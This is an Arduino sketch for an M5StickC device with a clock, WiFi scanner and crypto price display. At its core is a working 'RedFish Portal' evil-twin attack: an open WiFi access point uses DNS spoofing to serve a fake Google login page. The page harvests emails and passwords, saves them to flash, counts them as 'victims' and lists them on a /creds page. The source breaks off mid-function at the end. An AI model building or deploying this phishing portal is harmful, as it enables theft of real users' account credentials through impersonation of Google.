#include "logo.h"
#include <M5StickC.h>
#include <WiFi.h>
#include <WiFiMulti.h>
#include <HTTPClient.h>
#include <ArduinoJson.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Preferences.h>

// y del titolo "redfish xyz" in ogni schermata dove si trova 
const uint yRedFishTitolo = 2;

// *********** WIFI PORTAL **************************************
#define DEFAULT_AP_SSID_NAME "MyPortal Free WiFi" // <= change this
#define LOGIN_TITLE "Accedi"
#define LOGIN_SUBTITLE "Utilizza il tuo Account Google"
#define LOGIN_EMAIL_PLACEHOLDER "Email"
#define LOGIN_PASSWORD_PLACEHOLDER "Password"
#define LOGIN_MESSAGE "Effettua il login per navigare in sicurezza."
#define LOGIN_BUTTON "Avanti"
#define LOGIN_AFTER_MESSAGE "Per favore attendi qualche minuto. Presto sarai in grado di accedere a Internet."
#define TYPE_SSID_TEXT "SSID deve essere compresa tra 2 e 32\nInvalido: ?,$,\",[,\\,],+\n\nScrivi l'SSID\nPremi Invio per Confermare\n\n"
#define HAS_LED 10  // Number is equivalent to GPIO
#define GPIO_LED 10
#define WIFI_SSID_DEFAULT "WIFIAPDEFAULT" // <= change this
#define WIFI_PWD_DEFAULT "WIFIAPPASSWORDDEFAULT" // <= change this

uint totalCapturedCredentials = 0;
uint previousTotalCapturedCredentials = -1;  // stupid hack but wtfe
String capturedCredentialsHtml = "";
String capCreds = "";
String apSsidName = String(DEFAULT_AP_SSID_NAME);
const String DEFAULT_APP_NAME = "RedFishPortal";

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress AP_GATEWAY(172, 0, 0, 1);  // Gateway
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);
bool isChangingSSID = false;

// *********** WIFI SCANNER **************************************
int n;
int ssidLength     = 12;
int thisPage       = 0;
const int pageSize = 6;
bool on            = false;

// *********** CRYPTO WALLET **************************************
#define TOKENSIZE 9
String tokensec = "MYTALPHAVANTAGETOKEN"; //register a free token at alphavantage.co // <= change this
String token[TOKENSIZE] = { "TOKEN", "TOKEN", "TOKEN", "TOKEN", "TOKEN", "TOKEN", "TOKEN", "TOKEN", "TOKEN" };  //alphavantage.co // <= change this
String tokenprice[TOKENSIZE] = { "0.00", "0.00", "0.00", "0.00", "0.00", "0.00", "0.00", "0.00", "0.00" };  //alphavantage.co // <= change this
const uint32_t connectTimeoutMs = 10000;
WiFiMulti wifiMulti;
HTTPClient http;
bool cryptoDownloaded = false;

StaticJsonDocument<512> doc;

// *********** MENU & SELEZIONE **************************************
// 0 menu 
// 1 orologio 
// 2 wifi scan 
// 3 redfish portal
// 4 crypto wallet   
// 5 settings
int selectMenu = 0; 
bool appMenuselected = true;
bool appClockselected = false;
bool appWiFiSelected = false;
bool appRedFishSelected = false;
bool appCryptoWalletSelected = false;
bool canRefreshCryptoWallet = true;
bool appSettingsSelected = false;

uint luminosita = 3; //0 - 10
uint selectSettings = 0; // 0 luminosita, 1 aggiorna orario, 2 reset memoria, 3 restart

// *********** BATTERIA *****************************
int battery = 0;

// *********** OROLOGIO *****************************
RTC_TimeTypeDef RTC_TimeStruct;
RTC_DateTypeDef RTC_DateStruct;
const char* ntpServer = "time.inrim.it";
const int timezone = 1;

// *********** EEPROM *****************************
Preferences preferences;

void setup() 
{
  M5.begin(); 
  M5.IMU.Init();  // Init IMU
  M5.Axp.ScreenBreath(luminosita*10); // luminosita 30-100 
  // *** EEPROM ***
  getLuminositaFromEEPROM();  

  Serial.begin(115200);
  while (!Serial && millis() < 1000);

#if defined(HAS_LED)
  pinMode(GPIO_LED, OUTPUT);
  digitalWrite(GPIO_LED, HIGH);
#endif

  // *** WiFi ***
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  // *** Crypto Wallet 
  wifiMulti.addAP("MYWIFISSID1", "MYWIFIPASSWORD1");  
  wifiMulti.addAP("MYWIFISSID2", "MYWIFIPASSWORD2"); 

  // *** disegno menu principale ***
  drawMenu();
  M5.Lcd.fillScreen(DARKGREY);

  bootTime = lastActivity = millis();
}

void loop() {

  // da dovunque mi trovi, torno al MENU principale premendo il tasto POWER
  if (M5.Axp.GetBtnPress()) 
  {
    appMenuselected = true;
    appClockselected = false;
    appWiFiSelected = false;
    appRedFishSelected = false;
    if(selectMenu == 3) shutdownWebServer(); //stoppo AP
    appCryptoWalletSelected = false;
    appSettingsSelected = false;
    selectMenu = 0;
    selectSettings = 0;
    M5.Lcd.fillScreen(DARKGREY);
  }


  // ****************************************************
  // check selezione MENU
  if (appMenuselected == true && M5.BtnB.wasReleased()) 
  { 
    selectMenu = selectMenu + 1;
    if (selectMenu > 5) selectMenu = 1;
    //Serial.println(selectMenu);
    M5.Lcd.fillScreen(DARKGREY);
  } 

  // selezione APP
  switch(selectMenu) 
  {

    case 0: //menu
    break;

    case 1: //orologio
      if (M5.BtnA.wasReleased()) 
      {   
        appMenuselected = false;
        appClockselected = true;
        appWiFiSelected = false;
        appRedFishSelected = false;
        appCryptoWalletSelected = false;
        appSettingsSelected = false;
        M5.Lcd.fillScreen(DARKGREY);
      
        // *** EEPROM ***
        getLuminositaFromEEPROM();
      }
    break;

    case 2: //wifi scanner
      if (M5.BtnA.wasReleased()) 
      { 
        appMenuselected = false;
        appClockselected = false;  
        appWiFiSelected = true;
        appRedFishSelected = false;
        appCryptoWalletSelected = false;
        appSettingsSelected = false; 
        M5.Lcd.fillScreen(DARKGREY);     
        // *** EEPROM ***
        getLuminositaFromEEPROM();

        ScanWiFi();
      }
    break;

    case 3: //RedFish
      if (M5.BtnA.wasReleased()) 
      { 
        appMenuselected = false;
        appClockselected = false;  
        appWiFiSelected = false;
        appRedFishSelected = true;
        appCryptoWalletSelected = false;
        appSettingsSelected = false; 
        M5.Lcd.fillScreen(DARKGREY);
        // *** EEPROM ***
        getLuminositaFromEEPROM();     
        getTotCapCredFromEEPROM();   

        setupRedFishPortalAP();
        setupRedFishPortalWebServer();
      }

      if ((millis() - lastTick) > TICK_TIMER) 
      {

        lastTick = millis();

        if (totalCapturedCredentials != previousTotalCapturedCredentials) {
          previousTotalCapturedCredentials = totalCapturedCredentials;
        }
      }

      // WiFi Ssid changer
      if (isChangingSSID) 
      {
        isChangingSSID = false;
        setupRedFishPortalAP();
        setupRedFishPortalWebServer();
      }

      dnsServer.processNextRequest();
      webServer.handleClient();      

    break;

    case 4: //crypto wallet
      if (M5.BtnA.wasReleased()) 
      { 
        appMenuselected = false;
        appClockselected = false;  
        appWiFiSelected = false;
        appRedFishSelected = false;
        appCryptoWalletSelected = true;
        appSettingsSelected = false; 
        selectSettings = 0;
        M5.Lcd.fillScreen(DARKGREY);
        // *** EEPROM ***
        getLuminositaFromEEPROM();        

        if(canRefreshCryptoWallet == false) canRefreshCryptoWallet = true;

        M5.Lcd.setRotation(3);
        M5.Lcd.setTextSize(1);
        M5.Lcd.setTextColor(WHITE,BLACK);
        M5.Lcd.setCursor(10, 10);
        M5.Lcd.print("Downloading..."); 

        CryptoWallet();
      }
    break;

    case 5: //settings
      if (M5.BtnA.wasReleased()) 
      { 
        appMenuselected = false;
        appClockselected = false;  
        appWiFiSelected = false;
        appRedFishSelected = false;
        appCryptoWalletSelected = false;
        appSettingsSelected = true; 
        M5.Lcd.fillScreen(DARKGREY);
        // *** EEPROM ***
        getLuminositaFromEEPROM();        
      }
    break;
  }  

  drawMenu();
  M5.update();

  delay(100);
}

void getLuminositaFromEEPROM()
{
  // *** EEPROM ***
  preferences.begin(DEFAULT_APP_NAME.c_str(), false); 
  luminosita = preferences.getUInt("luminosita", 3); 
  preferences.end();  
  M5.Axp.ScreenBreath(luminosita*10);  
}

void setLuminositaToEEPROM()
{
  // *** EEPROM ***
  preferences.begin(DEFAULT_APP_NAME.c_str(), false); 
  preferences.putUInt("luminosita",luminosita); 
  preferences.end();  
}

void getTotCapCredFromEEPROM()
{
  // *** EEPROM ***
  preferences.begin(DEFAULT_APP_NAME.c_str(), false); 
  uint tot = preferences.getUInt("totcapcred", 0); 
  totalCapturedCredentials = tot;
  preferences.end();    
}


void drawClock() 
{
    M5.Lcd.setTextSize(2);
    M5.Lcd.setTextColor(RED,BLACK);
    M5.Lcd.setCursor(4, yRedFishTitolo);
    M5.Lcd.print("RedFish");
    M5.Lcd.setTextColor(WHITE,RED);
    M5.Lcd.print("Clock");

    M5.Lcd.setTextColor(WHITE,BLACK);
    M5.Lcd.setTextSize(2);

    M5.Rtc.GetTime(&RTC_TimeStruct);  // Gets the time in the real-time clock.
                                      
    M5.Rtc.GetData(&RTC_DateStruct);
    M5.Lcd.setCursor(10, 25);
    M5.Lcd.printf("%02d-%02d-%04d\n", 
                  RTC_DateStruct.Date,
                  RTC_DateStruct.Month, 
                  RTC_DateStruct.Year);
    M5.Lcd.setCursor(10, 45);
    M5.Lcd.printf("%02d : %02d : %02d\n", 
                  RTC_TimeStruct.Hours,
                  RTC_TimeStruct.Minutes, 
                  RTC_TimeStruct.Seconds);
    
    // scritta POWER - BACK
    drawMenuBack();
}

void setClockFromWiFi() 
{
  M5.Lcd.fillScreen(DARKGREY);
  M5.Lcd.setTextColor(WHITE);
  M5.Lcd.setTextSize(1);

  // connect to wifi
  //Serial.printf("Attempting to connect to %s \n", WIFI_SSID_DEFAULT);
  M5.Lcd.setCursor(4, 4);
  M5.Lcd.print("Connecting to WiFi...");

  WiFi.begin(WIFI_SSID_DEFAULT, WIFI_PWD_DEFAULT);
  delay(1000);

  while (WiFi.status() == WL_CONNECTED) 
  { 
    M5.Lcd.print("ok");

    M5.Lcd.setCursor(4, 12);
    M5.Lcd.print("Downloading...");
    
    // Set NTP time to local
    configTime(timezone * 3600, 3600, ntpServer);  // -5 is for my timezone. (utc - 5)
    M5.Lcd.print("ok");

    // Get local time
    struct tm timeInfo;
    if (getLocalTime(&timeInfo)) 
    {
      // Set RTC time
      RTC_TimeTypeDef TimeStruct;
      TimeStruct.Hours   = timeInfo.tm_hour;
      TimeStruct.Minutes = timeInfo.tm_min;
      TimeStruct.Seconds = timeInfo.tm_sec;
      M5.Rtc.SetTime(&TimeStruct);
      
      RTC_DateTypeDef DateStruct;
      DateStruct.WeekDay = timeInfo.tm_wday;
      DateStruct.Month = timeInfo.tm_mon + 1;
      DateStruct.Date = timeInfo.tm_mday;
      DateStruct.Year = timeInfo.tm_year + 1900;
      M5.Rtc.SetData(&DateStruct);
    }

    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    //Serial.println("Wifi disconnected"); 
    //M5.Lcd.setCursor(4, 20);
    //M5.Lcd.print("Disconnected");   

  }

}

void Show(int nav = 0)  // -1 top, 1 bottom
{
    if ((nav == 1) && (on == true)) {
        if ((thisPage) < ((n - 1) / pageSize)) {
            thisPage++;
        } else {
            thisPage = 0;
        }
        thisPage = 0;
        Show();
    } else {

        M5.Lcd.setTextSize(1);
        M5.Lcd.setCursor(4, 70);
        M5.Lcd.print("Totale: ");
        M5.Lcd.print(n);

        M5.Lcd.setTextSize(2);
        M5.Lcd.setTextColor(RED,BLACK);
        M5.Lcd.setCursor(4, yRedFishTitolo);
        M5.Lcd.print("RedFish");
        M5.Lcd.setTextColor(WHITE,RED);
        M5.Lcd.print("Scan");

        M5.Lcd.setTextSize(1);
        M5.Lcd.setTextColor(WHITE);
        M5.Lcd.setCursor(0, 22);
        for (int i = (thisPage * pageSize); i < ((thisPage * pageSize) + pageSize); i++) 
        {
            if (i >= n) break;
            String ssid = (WiFi.SSID(i).length() > ssidLength)
                              ? (WiFi.SSID(i).substring(0, ssidLength) + "...")
                              : WiFi.SSID(i);
            M5.Lcd.print(" " + String(i + 1));
            M5.Lcd.print(") " + ssid + " (" + WiFi.RSSI(i) + ");\n");
        }
    }
}

void ScanWiFi() {
    on = true;
    thisPage = 0;

    M5.Lcd.setTextSize(2);
    M5.Lcd.setCursor(30, 20);
    M5.Lcd.setTextColor(WHITE, BLACK);
    M5.Lcd.printf("Attendi");
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setCursor(40, 40);
    M5.Lcd.printf("Searching...");
    n = WiFi.scanNetworks();

    M5.Lcd.fillScreen(DARKGREY); 
}

void setupRedFishPortalAP() 
{
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apSsidName);
}

void setupRedFishPortalWebServer() 
{
  dnsServer.start(DNS_PORT, "*", AP_GATEWAY);  // DNS spoofing (Only HTTP)

  webServer.on("/post", []() {totalCapturedCredentials = totalCapturedCredentials + 1;

  webServer.send(HTTP_CODE, "text/html", index_POST());

  M5.Lcd.print("Victim Login");

  delay(50);

  M5.Lcd.fillScreen(DARKGREY);

#if defined(HAS_LED)
    blinkLed();
#endif
  });

  webServer.on("/creds", []() 
  {
    webServer.send(HTTP_CODE, "text/html", creds_GET());
  });

  webServer.on("/clear", []() 
  {
    webServer.send(HTTP_CODE, "text/html", clear_GET());
  });
    
  webServer.on("/ssid", []() {
    webServer.send(HTTP_CODE, "text/html", ssid_GET());
  });

  webServer.on("/postssid", []() {
    webServer.send(HTTP_CODE, "text/html", ssid_POST());
    shutdownWebServer();
    isChangingSSID=true;
  });  

  webServer.onNotFound([]() 
  {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index_GET());
  });

  webServer.begin();
}

void shutdownWebServer() 
{
  Serial.println("Stopping DNS");
  dnsServer.stop();
  Serial.println("Closing Webserver");
  webServer.close();
  Serial.println("Stopping Webserver");
  webServer.stop();
  Serial.println("Setting WiFi to STA mode");
  WiFi.mode(WIFI_MODE_STA);
  delay(100);
}

void drawRedFishPortal() 
{
  //M5.Lcd.fillScreen(DARKGREY);
  M5.Lcd.setSwapBytes(true);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(RED,BLACK);
  M5.Lcd.setCursor(2, yRedFishTitolo);
  M5.Lcd.print("RedFish");
  M5.Lcd.setTextColor(WHITE,RED);
  M5.Lcd.print("Portal");
  M5.Lcd.setTextColor(WHITE,BLACK);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setCursor(4,30);
  M5.Lcd.print("SSID: "+ apSsidName);
  M5.Lcd.setCursor(4,40);
  M5.Lcd.print("WiFi IP: "+String(AP_GATEWAY[0])+"."+String(AP_GATEWAY[1])+"."+String(AP_GATEWAY[2])+"."+String(AP_GATEWAY[3]));
  M5.Lcd.setCursor(4,50);
  M5.Lcd.printf("Vittime: %d\n", totalCapturedCredentials);
}

String getInputValue(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String getHtmlContents(String body) {
  String html =
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "  <title>"
    + apSsidName + "</title>"
                   "  <meta charset='UTF-8'>"
                   "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                   "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
                   "</head>"
                   "<body>"
                   "  <div class='container'>"
                   "    <div class='logo-container'>"
                   "      <?xml version='1.0' standalone='no'?>"
                   "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
                   "    </div>"
                   "    <div class=form-container>"
                   "      <center>"
                   "        <div class='containerlogo'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='BFr46e xduoyf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div>"
                   "      </center>"
                   "      <div style='min-height: 150px'>"
    + body + "      </div>"
             "    </div>"
             "  </div>"
             "</body>"
             "</html>";
  return html;
}

String creds_GET() 
{
  // reset string
  capturedCredentialsHtml = "";

  // *** EEPROM ***
  preferences.begin(DEFAULT_APP_NAME.c_str(), false); 
  uint tot = preferences.getUInt("totcapcred", 0);
  //Serial.println("tot: "+String(tot));

  for (int i = 1; i < tot+1; i++) 
  {
    String cc = "capcred_"+String(i);
    String cred = preferences.getString(cc.c_str()); 
    //Serial.println(String(i)+": "+cred);

    capturedCredentialsHtml = "<li><b>"+ cred + "</b></li>" + capturedCredentialsHtml;
  }

  preferences.end();  

  return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
}

String index_GET() {
  String loginTitle = String(LOGIN_TITLE);
  String loginSubTitle = String(LOGIN_SUBTITLE);
  String loginEmailPlaceholder = String(LOGIN_EMAIL_PLACEHOLDER);
  String loginPasswordPlaceholder = String(LOGIN_PASSWORD_PLACEHOLDER);
  String loginMessage = String(LOGIN_MESSAGE);
  String loginButton = String(LOGIN_BUTTON);

  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>");
}

String index_POST() {
  String email = getInputValue("email");
  String password = getInputValue("password");
  capturedCredentialsHtml = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;
  capCreds = email + ":" + password;
  //Serial.println(capCreds);
  //Serial.println(totalCapturedCredentials);
  //Serial.println("capcred_"+String(totalCapturedCredentials));

  // *** EEPROM ***
  preferences.begin(DEFAULT_APP_NAME.c_str(), false); 
  preferences.putUInt("totcapcred",totalCapturedCredentials); 
  String cc = "capcred_"+String(totalCapturedCredentials);
  preferences.putString(cc.c_str(),capCreds.c_str()); 
  preferences.end();    

  return getHtmlContents(LOGIN_AFTER_MESSAGE);
}

String clear_GET() {
  String email = "<p></p>";
  String password = "<p></p>";
  capturedCredentialsHtml = "<p></p>";
  totalCapturedCredentials = 0;
  return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
}

#if defined(HAS_LED)

void blinkLed() {
  int count = 0;

  while (count < 5) {
    digitalWrite(GPIO_LED, LOW);
    delay(100);
    digitalWrite(GPIO_LED, HIGH);
    delay(100);
    count = count + 1;
  }
}

#endif

String ssid_GET() {
  return getHtmlContents("<p>Set a new SSID for "+DEFAULT_APP_NAME+":</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apSsidName+"' required><button id=submitbtn class=submit-btn type=submit>Apply</button></div></form>");
}

String ssid_POST() {
  String ssid = getInputValue("ssid");
  Serial.println("SSID Has been changed to " + ssid);
  setSSID(ssid);
  drawRedFishPortal();
  return getHtmlContents(DEFAULT_APP_NAME+" shutting down and restarting with SSID <b>" + ssid + "</b>. Please reconnect.");
}

void setSSID(String ssid){
  apSsidName=ssid;
  return;
}

void CryptoWallet() 
{
  // se ho gia scaricato esco e leggo dai valori salvati
  if(cryptoDownloaded == true)
  {
    M5.Lcd.fillScreen(DARKGREY);
    
    M5.Lcd.setRotation(0);
    M5.Lcd.setCursor(1, 1);
    M5.Lcd.setTextColor(WHITE,BLACK);
    M5.Lcd.print("Power - Back");
    
    M5.Lcd.setRotation(3);
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(WHITE);

    for (int i=0; i < TOKENSIZE; i++) 
    {
      M5.Lcd.setCursor(4, 4+i*8);
      M5.Lcd.print(token[i]+": ");
      M5.Lcd.setCursor(4+64, 4+i*8);
      M5.Lcd.print(tokenprice[i]);
    }
  }
  else
  {

    if (canRefreshCryptoWallet == true && (wifiMulti.run(connectTimeoutMs) == WL_CONNECTED)) // wait for WiFi connection. 
    {  
      M5.Lcd.fillScreen(DARKGREY);
      M5.Lcd.setRotation(3);
      M5.Lcd.setTextSize(1);

      // quale WIFI e quale IP
      M5.Lcd.setRotation(0);
      M5.Lcd.setCursor(1, 1);
      M5.Lcd.setTextColor(WHITE,BLACK);
      M5.Lcd.println(WiFi.SSID().substring(0,12)); 
      M5.Lcd.setCursor(1, 1+8);
      M5.Lcd.println(WiFi.localIP());

      // scarico i token
      M5.Lcd.setRotation(3);
      M5.Lcd.setTextColor(WHITE);
      for (int i=0; i < TOKENSIZE; i++) 
      {
        M5.Lcd.setCursor(4, 4+i*8);
        M5.Lcd.print(token[i]+": ");
      }

      for (int i=0; i < TOKENSIZE; i++) 
      {
        http.begin("https://www.alphavantage.co/query?function=CURRENCY_EXCHANGE_RATE&from_currency="+token[i]+"&to_currency=EUR&apikey="+tokensec);
        //http.begin("https://www.alphavantage.co/query?function=CURRENCY_EXCHANGE_RATE&from_currency=USD&to_currency=JPY&apikey=demo");
        
        int httpCode = http.GET();  // start connection and send HTTP header.
        if (httpCode > 0) // httpCode will be negative on error. 
        {  
            if (httpCode == HTTP_CODE_OK) 
            {
              String payload = http.getString();           
              M5.Lcd.setCursor(4+64, 4+i*8);
              //Serial.println("payload:");
              //Serial.println(payload);

              const char* json = payload.c_str();
              //Serial.println("json:");
              //Serial.println(json);

              // Deserialize the JSON document
              DeserializationError error = deserializeJson(doc, json);
              double cryptoprice = doc["Realtime Currency Exchange Rate"]["5. Exchange Rate"];
              //Serial.println(cryptoprice);
              tokenprice[i] = cryptoprice;
              M5.Lcd.print(cryptoprice);

              // scaricati una volta, leggo dai dati salvati
              cryptoDownloaded = true;

            }
        } 
        else 
        {
            Serial.printf("CryptoWallet => [HTTP] GET... failed, error: %s\n", http.errorToString(httpCode).c_str());
        }
        http.end();
        delay(100);
          
      }

      // refresho ancora solo se clicco il tasto A (M5)
      canRefreshCryptoWallet = false;

    } 
    else 
    {
      M5.Lcd.fillScreen(DARKGREY);
      M5.Lcd.setRotation(3);
      M5.Lcd.setCursor(4, 4);
      M5.Lcd.setTextColor(WHITE,BLACK);
      M5.Lcd.print("CryptoWallet => Connection Failed");

      // scritta POWER - BACK
      drawMenuBack();
    }

    //Serial.println("Download ok"); 
  }
}

void drawWiFiScan() 
{ 
  Show(1);

  // scritta POWER - BACK
  drawMenuBack();  
}

void drawRedFishLogo()
{
  int x = 4;
  int y = M5.Lcd.height() - logoHeight - 10;    
  M5.Lcd.drawXBitmap(x, y, redfish_ivorobertis, logoWidth, logoHeight, TFT_LIGHTGREY);
}

void drawSettings()
{
  M5.Lcd.fillScreen(DARKGREY);
  M5.Lcd.setTextColor(WHITE);

  M5.Lcd.setTextSize(2);
  M5.Lcd.setCursor(4, yRedFishTitolo);
  M5.Lcd.setTextColor(WHITE,RED);
  M5.Lcd.print("Settings");

  M5.Lcd.setRotation(3);
  M5.Lcd.setTextSize(1);

  // luminosita
  if (selectSettings == 1 )
  {
    M5.Lcd.setTextColor(WHITE, BLACK);
    M5.Lcd.setCursor(4, 24);
    M5.Lcd.print("Luminosita (3-10): ");  
    M5.Lcd.print(luminosita);
  
    if(M5.BtnA.wasReleased())
    {
      // vai col papiello della luminosita
      luminosita = luminosita +1;
      if (luminosita > 10) luminosita = 3;
      M5.Axp.ScreenBreath(luminosita*10);

      // *** EEPROM ***
      setLuminositaToEEPROM();
    }
  }
  else
  {
    M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setCursor(4, 24);
    M5.Lcd.print("Luminosita (3-10): ");  
    M5.Lcd.print(luminosita);
  }    

  // dataora wifi
  if (selectSettings == 2 )
  {
    M5.Lcd.setTextColor(WHITE, BLACK);
    M5.Lcd.setCursor(4, 32);
    M5.Lcd.print("Aggiorna DataOra con WiFi");  
  
    if(M5.BtnA.wasReleased())
    {
      // vai col papiello dell'aggiornamento orario
      setClockFromWiFi();
      selectSettings = 0; // reset
    }
  }
  else
  {
    M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setCursor(4, 32);
    M5.Lcd.print("Aggiorna DataOra con WiFi");  
  }    
  
  //reset memoria eeprom
  if (selectSettings == 3 )
  {
    M5.Lcd.setTextColor(WHITE, RED);
    M5.Lcd.setCursor(4, 40);
    M5.Lcd.print("Reset EEPROM");  
  
    if(M5.BtnA.wasReleased())
    {
      preferences.begin(DEFAULT_APP_NAME.c_str(), false); 
      preferences.clear(); 
      preferences.end();  
      ESP.restart();  // Restart. 

    }
  }
  else
  {
    M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setCursor(4, 40);
    M5.Lcd.print("Reset EEPROM");
  }  
  
  // reboot  
  if (selectSettings == 4 )
  {
    M5.Lcd.setTextColor(WHITE, RED);
    M5.Lcd.setCursor(4, 48);
    M5.Lcd.print("Reboot");  
  
    if(M5.BtnA.wasReleased())
    {
      M5.Lcd.fillScreen(DARKGREY);
      M5.Lcd.setTextSize(2);
      M5.Lcd.setCursor(4, 20);
      M5.Lcd.setTextColor(WHITE, BLACK);
      M5.Lcd.print("Restarting...");
      delay(3000);   // delay 3. 
      ESP.restart();  // Restart. 
    }
  }
  else
  {
    M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setCursor(4, 48);
    M5.Lcd.print("Reboot");  
  }

  // leggo temperatura
  drawTemperature(); 

  // batteria
  drawBatteryPercent();

  // scritta POWER - BACK
  drawMenuBack();

}

void drawTemperature() 
{
    float temp = 0;
    M5.IMU.getTempData(&temp);
    M5.Lcd.setCursor(4, 70);
    M5.Lcd.setTextColor(WHITE);
    int t = temp;
    M5.Lcd.printf("Temp C: %d", t);
}

void drawBatteryPercent() 
{
  M5.Lcd.setCursor(134, 4);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(RED);

